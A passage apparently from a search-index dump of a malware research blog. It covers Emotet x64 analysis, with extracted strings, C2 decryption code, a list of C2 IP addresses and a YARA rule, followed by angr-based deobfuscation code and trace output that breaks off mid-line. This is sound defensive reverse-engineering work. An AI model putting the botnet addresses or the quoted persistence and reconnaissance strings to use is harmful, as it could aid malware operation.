xbdN xbd x9d x8f xcf xe0 x10[4L x82 x04&amp; x02 xd3 xba xac xf1 xfb x9f,v&#39; %s%s.exe %s%s.dll %s regsvr32.exe &#34;%s&#34; %s shlwapi.dll advapi32.dll wininet.dll crypt32.dll userenv.dll wtsapi32.dll bcrypt.dll urlmon.dll shell32.dll SHA256 Microsoft Primitive Provider ECCPUBLICBLOB HASH ObjectLength KeyDataBlob AES ECDH_P256 ECDSA_P256 RNG POST %u.%u.%u.%u --%S-- Cookie: %s=%s Content-Type: multipart/form-data; boundary=%s --%S Content-Disposition: form-data; name=&#34;%S&#34;; filename=&#34;%S&#34; Content-Type: application/octet-stream %s_%08X nltest /dclist: systeminfo ipconfig /all %s %s %s regsvr32.exe &#34;%s %s&#34; SOFTWARE Microsoft Windows CurrentVersion Run %s %s%x %s regsvr32.exe &#34;%s %s&#34; %s WinSta0 Default %s %s %s * %s:Zone.Identifier %s %s.exe     . C2 Table . The c2 list is stored in the .data section in the exact same format as the 32-bit sample. We were able to re-use our 32-bit c2 extractor code. . data_data = None for s in pe.sections: if b&#39;.data&#39; in s.Name: data_data = s.get_data() print(data_data[:100]) key = data_data[:4] data_len = struct.unpack(&#39;&lt;I&#39;,data_data[:4])[0] ^ struct.unpack(&#39;&lt;I&#39;,data_data[4:8])[0] enc_data = data_data[8:8+data_len] ptxt_data = xor_decrypt(enc_data, key) print(tohex(ptxt_data)) print(&quot; n== C2 List== &quot;) for i in range(0,len(ptxt_data),8): print(&quot;%d.%d.%d.%d:%d&quot; % (ptxt_data[i+0],ptxt_data[i+1],ptxt_data[i+2],ptxt_data[i+3],struct.unpack(&#39;&gt;H&#39;,ptxt_data[i+4:i+6])[0])) . b&#34;8 xfd xb9 x1e xc0 xfc xb9 x1e x88 xe2 xf0D9F xb9 x1f x15 xb1&amp; xc8&#39;m xb9 x1f xb28*{9F xb9 x1fPU#Q&#39;m xb9 x1f xad xc5: x02&#39;m xb9 x1f= xf4 xcd xe8&#39;m xb9 x1fu xacN x8e&#39;m xb9 x1f x94 x95B x84&#39;m xb9 x1f n xe3 x91 xda&#39;m xb9 x1f x95)x xe7&#39;m xb9 x1f x0b xa6 xf5G&#39;m xb9 x1f xfd x0f/ xea&#34; b&#39;b01f495a01bb00012d4c9fd61f9000018ac5936501bb000168a89a4f1f9000019538831c1f900001050974f61f9000014d51f7901f900001ac68fb9a1f900001321e28c41f900001add4c1f91f900001335b4c591f900001c5f296f41f900001674bc90201bb000133fe8cee1ba800014f8923c61f900001480fc90f1f9000011b36593a1f900001bd7e6fc81ba80001c4da1e5301bb000152a5987f1f900001a44463031f900001b76fe3891f900001a7acfda21f900001997e92191ba8000181e8bc5d01bb0001976a70c41f900001bc2c141901bb0001a76373231f900001867a42c11f900001b90487a51f900001d41862631f900001335b07051f900001923be22d01bb0001836418e700500001d4ed11631f900001c95ea6a201bb00012db0e87c01bb00019f41580a1f900001a0108e381f900001d89ee2ce01bb0001cb726d7c01bb0001672b2eb601bb00012e37de0b01bb0001d17e62ce1f9000015bcf1c211f90000101ea02e81f9000012d7673631f900001cebd1cc71f9000015e172d56102f00019e45de6501bb000167461c661f9000016532005b1f9000013ae32aec0050000177c17c291ba800016bb6e18e1f900001b99d52d31f9000012deb081e1f9000016784f21a1f90000101ea15491ba800016ee875ba1f900001d161a3d601bb0001b908d4821ba80001d1faf6ce01bb0001&#39; == C2 List== 176.31.73.90:443 45.76.159.214:8080 138.197.147.101:443 104.168.154.79:8080 149.56.131.28:8080 5.9.116.246:8080 77.81.247.144:8080 172.104.251.154:8080 50.30.40.196:8080 173.212.193.249:8080 51.91.76.89:8080 197.242.150.244:8080 103.75.201.2:443 51.254.140.238:7080 79.137.35.198:8080 72.15.201.15:8080 27.54.89.58:8080 189.126.111.200:7080 196.218.30.83:443 82.165.152.127:8080 164.68.99.3:8080 183.111.227.137:8080 167.172.253.162:8080 153.126.146.25:7080 129.232.188.93:443 151.106.112.196:8080 188.44.20.25:443 167.99.115.35:8080 134.122.66.193:8080 185.4.135.165:8080 212.24.98.99:8080 51.91.7.5:8080 146.59.226.45:443 131.100.24.231:80 212.237.17.99:8080 201.94.166.162:443 45.176.232.124:443 159.65.88.10:8080 160.16.142.56:8080 216.158.226.206:443 203.114.109.124:443 103.43.46.182:443 46.55.222.11:443 209.126.98.206:8080 91.207.28.33:8080 1.234.2.232:8080 45.118.115.99:8080 206.189.28.199:8080 94.23.45.86:4143 158.69.222.101:443 103.70.28.102:8080 101.50.0.91:8080 58.227.42.236:80 119.193.124.41:7080 107.182.225.142:8080 185.157.82.211:8080 45.235.8.30:8080 103.132.242.26:8080 1.234.21.73:7080 110.232.117.186:8080 209.97.163.214:443 185.8.212.130:7080 209.250.246.206:443 . Binary Exploration with Dumpulator . Using Dumpultor . First we load the sample in x64dbg | Install mindump plugin | Then run to entrypoint of the DLL | Run mindump from the x64dbg command bar MiniDump &lt;output_file.dmp&gt; | . from dumpulator import Dumpulator DUMP_FILE = &#39;/tmp/work/emotet_b481.dmp&#39; dp = Dumpulator(DUMP_FILE, quiet=True) . def decrypt_string(string_address): fn_decrypt = 0x07FFEA424B924 result = dp.call(fn_decrypt, [0x9695E, string_address, 0xD71EB]) ptxt_string = dp.read(result, 200) out = ptxt_string.split(b&#39; x00 x00&#39;)[0].replace(b&#39; x00&#39;,b&#39;&#39;) return bytes(out).decode(&#39;utf-8&#39;) blob_1 = 0x007FFEA4231000 ptxt_string = decrypt_string(blob_1) print(ptxt_string) . %s%s.exe . Generate a Yara Rule . Hunting Traints . These are data that might be useful for hunting related samples, but not great for non-fp identification of Emotet . internal name Y.dll | export DllRegisterServer | . String decryption loop . .text:00007FFEA424BAB9 C1 E9 10 shr ecx, 10h .text:00007FFEA424BABC 66 C1 E8 08 shr ax, 8 . Robust Rule Traits . We know that the .text and .data sections start with encrypted data that is in a set format: &lt;DWORD:key&gt;&lt;DWORD:encrypted len&gt;. We also know that that encrypted length is XOR encrypted with the key. We can exploit this info combined with the fact that the encrypted data length is not going to be more than 255 for the strings in .text or 65536 for the c2 table in .data. This tells us that most significant 2-bytes or 3-bytes will be equal for the key and the encrypted length. . Our yara rule will just compare these bytes and also make sure that they are no null bytes. . This might be good, but we don&#39;t know??? Some considerations: . if there are common PE files that have repeating bytes at the start of both section this could cause a lot of FPs we should test | . yara import &quot;pe&quot; rule Emotetx64 { condition: pe.is_64bit() and uint16(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 2) == uint16(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 6) and uint16(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 2) != 0 and uint8(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset) != uint8(pe.sections[pe.section_index(&quot;.data&quot;)].raw_data_offset + 4) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 1) == uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 5) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 1) != 0 and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 2) == uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 6) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 2) != 0 and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 3) == uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 7) and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 3) != 0 and uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset) != uint8(pe.sections[pe.section_index(&quot;.text&quot;)].raw_data_offset + 4) } . data = b&#39; xAA x8B xDA x35 xA2 x8B xDA x35 x8F xF8 xFF x46 x84 xEE xA2 x50 x67 x9B x33 xDD xF6 xE0&#39; key = b&#39; xAA x8B xDA x35&#39; data_len = b&#39; xA2 x8B xDA x35&#39; .",
            "url": "https://research.openanalysis.net/emotet/malware/2022/04/30/emotet_x64.html",
            "relUrl": "/emotet/malware/2022/04/30/emotet_x64.html",
            "date": " ‚Ä¢ Apr 30, 2022"
        }
        
    
  
    
        ,"post53": {
            "title": "Emotet Deobfuscation Generic Solution",
            "content": "Overview . We have updated our algorithm to hadle the CFG normalization and to handle branching within a state (no part of the dispatcher). . References . IDA IL-only Emotet Deobfuscation Tool | . import angr, claripy from queue import Queue import struct import logging logging.getLogger(&#39;angr&#39;).setLevel(&#39;ERROR&#39;) # maintain a state counter state_count = 0 # maintain a list of entry bb for states entry_bb_list = [] # bb_tree[bb_address] = {states[], end, children=[] } bb_tree = {} # Use a queue for BFS # The queue contains state_info = {&#39;state_value&#39;:0, &#39;sim_state&#39;:initial_state} q = Queue() # Function information BINARY_PATH = &#39;/tmp/emotet.bin&#39; fn_start = 0x10008784 fn_end = 0x100099D2 state_register = &#39;ebx&#39; # Start angr project project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # Setup function initial state on queue initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) state_count += 1 state_info = {&#39;state_value&#39;:0, &#39;sim_state&#39;:initial_state} entry_bb_list.append(fn_start) q.put(state_info) # Walk the queue while not q.empty(): state_info = q.get() state_value = state_info.get(&#39;state_value&#39;) sim_state = state_info.get(&#39;sim_state&#39;) bb_address = sim_state.block().addr bb_end_address = bb_address + sim_state.block().size print(f&quot; n============================== n&quot;) print(f&quot;BB: {hex(bb_address)} - {hex(bb_end_address)}&quot;) print(f&quot; t State Value: {state_value}&quot;) # If we have already processed this bb for the same state disregard it if bb_address in bb_tree: if state_value in bb_tree[bb_address].get(&#39;states&#39;): print(f&quot; t !! Already processed for this state - END !!&quot;) continue # Get successors successors = project.factory.successors(sim_state) # Get children children = [s.addr for s in successors] print(f&quot; t Children:&quot;) for c in children: print(f&quot; t t {hex(c)}&quot;) # Add info to bb tree if bb_address in bb_tree: bb_tree[bb_address][&#39;states&#39;].append(state_value) bb_tree[bb_address][&#39;children&#39;] += children else: bb_tree[bb_address] = {&#39;states&#39;:[state_value], &#39;end&#39;:bb_end_address, &#39;children&#39;:children } # Generate the successors and push them onto the queue for successor in successors: print(f&quot; n t Successor: {hex(successor.addr)}&quot;) if not successor.regs.get(state_register).uninitialized: # If STATE is set reset the sim_state # Set clean sim_state new_sim_state = project.factory.blank_state(addr=successor.addr) new_sim_state.options.add(angr.options.CALLLESS) for reg_name in [&#39;eax&#39;,&#39;ecx&#39;,&#39;edx&#39;,&#39;ebx&#39;,&#39;esp&#39;,&#39;ebp&#39;,&#39;esi&#39;,&#39;edi&#39;]: if reg_name != state_register: new_sim_state.memory.store(new_sim_state.regs.get(reg_name), successor.regs.get(reg_name)) # Add to queue state_info = {&#39;state_value&#39;:state_value, &#39;sim_state&#39;:new_sim_state} q.put(state_info) print(f&quot; t t STATE registers set - reset sim state&quot;) print(f&quot; t t Added to queue -&gt;&quot;) else: # If constraints for successor include == STATE # check if we have already seen the successor in entry_bb_list if we have don&#39;t push it else add it flag_queue_successor = True state_info = {&#39;state_value&#39;:state_value, &#39;sim_state&#39;:successor} for constraint in successor.solver.constraints: for constraint_variable in constraint.variables: if &#39;reg_&#39;+ state_register in constraint_variable: if constraint.op == &#39;__eq__&#39;: print(f&quot; t t State entry bb found!&quot;) # This is a state entry bb if successor.addr in entry_bb_list: # if it is already in entry_bb_list then don&#39;t add it to the queue flag_queue_successor = False print(f&quot; t t t Already processed this state - END!&quot;) else: # Setup new entry state for queue new_state_value = state_count state_count += 1 # Set clean sim_state new_sim_state = project.factory.blank_state(addr=successor.addr) new_sim_state.options.add(angr.options.CALLLESS) for reg_name in [&#39;eax&#39;,&#39;ecx&#39;,&#39;edx&#39;,&#39;ebx&#39;,&#39;esp&#39;,&#39;ebp&#39;,&#39;esi&#39;,&#39;edi&#39;]: if reg_name != state_register: new_sim_state.memory.store(new_sim_state.regs.get(reg_name), successor.regs.get(reg_name)) state_info = {&#39;state_value&#39;:new_state_value, &#39;sim_state&#39;:new_sim_state} entry_bb_list.append(successor.addr) print(f&quot; t t t New state: {new_state_value}&quot;) if flag_queue_successor: print(f&quot; t t Added to queue -&gt;&quot;) # If we are ok to add the successor to the queue add it now q.put(state_info) print(&quot;** Completed initial analysis **&quot;) # Normalize bb_tree and combine states for overlapping blocks # Basic block normalization # If there is a jmp to the middle of a bb angr doesn&#39;t split it into two bb, this causes issues where a &quot;single&quot; bb # in the view of anger is actually two different types of bb # To normalize these what we need to do is split the bottom parts off the any non-normalized bb and set the type of # the top part of the block to be the same as the previous block # bb_tree[bb_address] = {states[], end, children=[] } # Sort the bb by address bb_tree_sorted = {key:bb_tree[key] for key in sorted(bb_tree.keys())} # For each bb search for bb that end after it and truncate them # Also update their type to match the previous type for bb_address in bb_tree_sorted: bb_tree_sorted[bb_address][&#39;children&#39;] = list(set(bb_tree_sorted[bb_address][&#39;children&#39;])) for ptr in bb_tree_sorted: if ptr &gt;= bb_address: # We have passed our bb, not more potential unnormalized bb for this address break if bb_address &lt; bb_tree_sorted[ptr].get(&#39;end&#39;): # Truncate the block bb_tree_sorted[ptr][&#39;end&#39;] = bb_address # Update the truncated block children with only next block bb_tree_sorted[ptr][&#39;children&#39;] = [bb_address] # Update the overlapped block states by combining both state lists bb_tree_sorted[bb_address][&#39;states&#39;] = list(set(bb_tree_sorted[bb_address][&#39;states&#39;] + bb_tree_sorted[ptr][&#39;states&#39;])) # Print sorted bb_tree for bb_address in bb_tree_sorted: print(f&quot;{hex(bb_address)} - States: {bb_tree_sorted[bb_address].get(&#39;states&#39;)} Children: {[hex(c) for c in set(bb_tree_sorted[bb_address].get(&#39;children&#39;))]} &quot;) # Walk bb_tree and group bb by state, identify state end blocks # bb_state_map[addr] = {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548} bb_state_map = {} for bb_address in bb_tree_sorted: if len(bb_tree_sorted[bb_address][&#39;children&#39;]) == 0: # This is an end block mark it as obb bb_state_map[bb_address] = {&#39;is_obb&#39;: True, &#39;end&#39;: bb_tree_sorted[bb_address][&#39;end&#39;]} elif len(bb_tree_sorted[bb_address][&#39;states&#39;]) == 1: # This is an obb bb_state_map[bb_address] = {&#39;is_obb&#39;: True, &#39;end&#39;: bb_tree_sorted[bb_address][&#39;end&#39;]} else: bb_state_map[bb_address] = {&#39;is_obb&#39;: False, &#39;end&#39;: bb_tree_sorted[bb_address][&#39;end&#39;]} . ============================== BB: 0x10008784 - 0x10008914 State Value: 0 Children: 0x10008914 Successor: 0x10008914 STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x10008914 - 0x10008aa1 State Value: 0 Children: 0x10008aa1 Successor: 0x10008aa1 Added to queue -&gt; ============================== BB: 0x10008aa1 - 0x10008c31 State Value: 0 Children: 0x10008c31 Successor: 0x10008c31 Added to queue -&gt; ============================== BB: 0x10008c31 - 0x10008dbb State Value: 0 Children: 0x10008dbb Successor: 0x10008dbb Added to queue -&gt; ============================== BB: 0x10008dbb - 0x10008f47 State Value: 0 Children: 0x10008f47 Successor: 0x10008f47 Added to queue -&gt; ============================== BB: 0x10008f47 - 0x100090d0 State Value: 0 Children: 0x100090d0 Successor: 0x100090d0 Added to queue -&gt; ============================== BB: 0x100090d0 - 0x1000925d State Value: 0 Children: 0x1000925d Successor: 0x1000925d Added to queue -&gt; ============================== BB: 0x1000925d - 0x100093e6 State Value: 0 Children: 0x100093e6 Successor: 0x100093e6 Added to queue -&gt; ============================== BB: 0x100093e6 - 0x10009555 State Value: 0 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 0 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! New state: 1 Added to queue -&gt; Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 0 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! New state: 2 Added to queue -&gt; Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009863 - 0x1000988a State Value: 1 Children: 0x1000988a Successor: 0x1000988a Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 0 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! New state: 3 Added to queue -&gt; Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100099c1 - 0x100099d2 State Value: 2 Children: 0x10009549 Successor: 0x10009549 STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 0 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! New state: 4 Added to queue -&gt; Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x1000988a - 0x10009894 State Value: 1 Children: 0x1000953a Successor: 0x1000953a Added to queue -&gt; ============================== BB: 0x100097cd - 0x100097e6 State Value: 3 Children: 0x100097e6 Successor: 0x100097e6 Added to queue -&gt; ============================== BB: 0x10009563 - 0x1000956f State Value: 0 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! New state: 5 Added to queue -&gt; Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 2 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x100098e8 - 0x10009904 State Value: 4 Children: 0x10009904 Successor: 0x10009904 Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 0 Children: 0x100098ac 0x100099c6 Successor: 0x100098ac State entry bb found! New state: 6 Added to queue -&gt; Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000953a - 0x10009555 State Value: 1 Children: 0x10009555 Successor: 0x10009555 Added to queue -&gt; ============================== BB: 0x100097e6 - 0x10009830 State Value: 3 Children: 0x10009830 Successor: 0x10009830 Added to queue -&gt; ============================== BB: 0x10009713 - 0x10009732 State Value: 5 Children: 0x10009732 Successor: 0x10009732 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 0 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! New state: 7 Added to queue -&gt; Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 2 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 2 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009904 - 0x1000998c State Value: 4 Children: 0x1000998c Successor: 0x1000998c Added to queue -&gt; ============================== BB: 0x100098ac - 0x100098d8 State Value: 6 Children: 0x100098d8 Successor: 0x100098d8 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 0 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! New state: 8 Added to queue -&gt; Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 1 Children: 0x1000955b Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009830 - 0x1000985b State Value: 3 Children: 0x1000985b Successor: 0x1000985b STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x10009732 - 0x10009750 State Value: 5 Children: 0x10009750 Successor: 0x10009750 Added to queue -&gt; ============================== BB: 0x100095a9 - 0x100095c2 State Value: 7 Children: 0x100095c2 Successor: 0x100095c2 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 0 Children: 0x1000957b 0x100099c6 Successor: 0x1000957b State entry bb found! New state: 9 Added to queue -&gt; Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 2 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 2 Children: 0x100098a4 Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x1000998c - 0x10009998 State Value: 4 Children: 0x10009998 0x1000999f Successor: 0x10009998 Added to queue -&gt; Successor: 0x1000999f Added to queue -&gt; ============================== BB: 0x100098d8 - 0x100098e8 State Value: 6 Children: ============================== BB: 0x100099d2 - 0x100099d7 State Value: 8 Children: 0x100098db Successor: 0x100098db Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 0 Children: 0x10009894 Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 1 Children: 0x10009563 Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x1000985b - 0x10009863 State Value: 3 Children: 0x100096fa Successor: 0x100096fa Added to queue -&gt; ============================== BB: 0x10009750 - 0x1000977e State Value: 5 Children: 0x1000977e Successor: 0x1000977e Added to queue -&gt; ============================== BB: 0x100095c2 - 0x100095e3 State Value: 7 Children: 0x100095e3 Successor: 0x100095e3 Added to queue -&gt; ============================== BB: 0x1000957b - 0x10009595 State Value: 9 Children: 0x10009595 Successor: 0x10009595 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 0 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 2 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 2 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009998 - 0x1000999f State Value: 4 Children: 0x100099a4 Successor: 0x100099a4 Added to queue -&gt; ============================== BB: 0x1000999f - 0x100099ba State Value: 4 Children: 0x100099ba Successor: 0x100099ba STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x100098db - 0x100098e8 State Value: 8 Children: ============================== BB: 0x10009894 - 0x100098a0 State Value: 0 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 1 Children: 0x1000956f Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100096fa - 0x10009713 State Value: 3 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x1000977e - 0x100097af State Value: 5 Children: 0x100097af Successor: 0x100097af STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x100095e3 - 0x10009615 State Value: 7 Children: 0x10009615 Successor: 0x10009615 Added to queue -&gt; ============================== BB: 0x10009595 - 0x100095a9 State Value: 9 Children: 0x1000953a Successor: 0x1000953a STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 2 Children: 0x10009573 Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 2 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100099a4 - 0x100099ba State Value: 4 Children: 0x100099ba Successor: 0x100099ba Added to queue -&gt; ============================== BB: 0x100099ba - 0x100099c1 State Value: 4 Children: 0x100096fa Successor: 0x100096fa Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 1 Children: 0x10009573 Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 3 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100097af - 0x100097c5 State Value: 5 Children: 0x100097c5 Successor: 0x100097c5 Added to queue -&gt; ============================== BB: 0x10009615 - 0x100096a2 State Value: 7 Children: 0x100096a2 Successor: 0x100096a2 Added to queue -&gt; ============================== BB: 0x1000953a - 0x10009555 State Value: 9 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 2 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 2 !! Already processed for this state - END !! ============================== BB: 0x100099ba - 0x100099c1 State Value: 4 !! Already processed for this state - END !! ============================== BB: 0x100096fa - 0x10009713 State Value: 4 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009573 - 0x1000957b State Value: 1 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 3 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x100097c5 - 0x100097cd State Value: 5 Children: 0x100096f5 Successor: 0x100096f5 Added to queue -&gt; ============================== BB: 0x100096a2 - 0x100096d6 State Value: 7 Children: 0x100096d6 Successor: 0x100096d6 STATE registers set - reset sim state Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 9 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 9 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 2 !! Already processed for this state - END !! ============================== BB: 0x100099c6 - 0x100099d2 State Value: 4 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 1 Children: 0x10009549 Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 3 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 3 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x100096f5 - 0x10009713 State Value: 5 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x100096d6 - 0x100096f2 State Value: 7 Children: 0x100096f2 Successor: 0x100096f2 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 9 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 9 Children: 0x100098a4 Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 4 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 1 Children: 0x10009555 Successor: 0x10009555 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 3 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 0x100098a4 State Value: 3 Children: 0x100098e8 0x100098a4 Successor: 0x100098e8 State entry bb found! Already processed this state - END! Successor: 0x100098a4 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 5 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x100096f2 - 0x10009713 State Value: 7 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009563 - 0x1000956f State Value: 9 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 9 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 4 Children: 0x10009863 0x1000955b Successor: 0x10009863 State entry bb found! Already processed this state - END! Successor: 0x1000955b Added to queue -&gt; ============================== BB: 0x10009894 - 0x100098a0 State Value: 4 Children: 0x100099c1 0x100098a0 Successor: 0x100099c1 State entry bb found! Already processed this state - END! Successor: 0x100098a0 Added to queue -&gt; ============================== BB: 0x10009555 - 0x1000955b State Value: 1 !! Already processed for this state - END !! ============================== BB: 0x10009563 - 0x1000956f State Value: 3 Children: 0x10009713 0x1000956f Successor: 0x10009713 State entry bb found! Already processed this state - END! Successor: 0x1000956f Added to queue -&gt; ============================== BB: 0x100098a4 - 0x100098ac State Value: 3 Children: 0x100099c6 Successor: 0x100099c6 Added to queue -&gt; ============================== BB: 0x10009549 - 0x10009555 State Value: 5 Children: 0x10009555 0x10009894 Successor: 0x10009555 Added to queue -&gt; Successor: 0x10009894 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 7 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x1000956f - 0x10009573 State Value: 9 Children: 0x100095a9 0x10009573 Successor: 0x100095a9 State entry bb found! Already processed this state - END! Successor: 0x10009573 Added to queue -&gt; ============================== BB: 0x100099c6 - 0x100099d2 State Value: 9 Children: 0x100099d2 0x10009549 Successor: 0x100099d2 State entry bb found! Already processed this state - END! Successor: 0x10009549 Added to queue -&gt; ============================== BB: 0x1000955b - 0x10009563 State Value: 4 Children: 0x100097cd 0x10009563 Successor: 0x100097cd State entry bb found! Already processed this state - END! Successor: 0x10009563 Added to queue -&gt; ============================== BB: 0x100098a0 - 